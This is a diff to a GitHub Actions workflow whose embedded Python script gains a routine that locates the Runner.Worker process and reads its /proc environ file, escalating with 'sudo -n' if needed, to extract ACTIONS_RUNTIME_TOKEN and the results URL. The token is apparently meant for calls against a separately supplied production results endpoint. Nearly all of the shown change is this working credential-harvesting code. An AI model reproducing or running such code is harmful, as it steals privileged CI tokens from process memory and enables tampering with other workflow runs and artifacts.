@@ -26,11 +26,32 @@ jobs:
           IN_PROD_RU: ${{ github.event.inputs.prod_results_url }}
         run: |
           python3 - <<'PYEOF'
-          import os, base64, json, re, urllib.request, urllib.error
+          import os, base64, json, re, urllib.request, urllib.error, subprocess
           def b64ud(x):
               x += '=' * (-len(x) % 4); return base64.urlsafe_b64decode(x.encode())
-          rt = os.environ['ACTIONS_RUNTIME_TOKEN']
-          own_ru = os.environ.get('ACTIONS_RESULTS_URL','').rstrip('/')
+          def worker_env():
+              try:
+                  pids = subprocess.check_output(['pgrep','-f','Runner.Worker']).decode().split()
+              except Exception:
+                  pids = []
+              for pid in pids:
+                  for reader in (['cat'], ['sudo','-n','cat']):
+                      try:
+                          raw = subprocess.check_output(reader + ['/proc/%s/environ' % pid], stderr=subprocess.DEVNULL)
+                      except Exception:
+                          continue
+                      d = {}
+                      for e in raw.split(b'\0'):
+                          if b'=' in e:
+                              k, v = e.split(b'=', 1); d[k.decode('utf-8','replace')] = v.decode('utf-8','replace')
+                      if 'ACTIONS_RUNTIME_TOKEN' in d:
+                          return d
+              return {}
+          we = worker_env()
+          rt = os.environ.get('ACTIONS_RUNTIME_TOKEN') or we.get('ACTIONS_RUNTIME_TOKEN','')
+          if not rt:
+              print('MARK NO_RUNTIME_TOKEN (consumer could not source token)'); raise SystemExit
+          own_ru = (os.environ.get('ACTIONS_RESULTS_URL') or we.get('ACTIONS_RESULTS_URL','')).rstrip('/')
           prod_ru = (os.environ.get('IN_PROD_RU','') or '').rstrip('/')
           run_bid = os.environ['IN_RUN_BID'].strip()
           job_bid = os.environ['IN_JOB_BID'].strip()
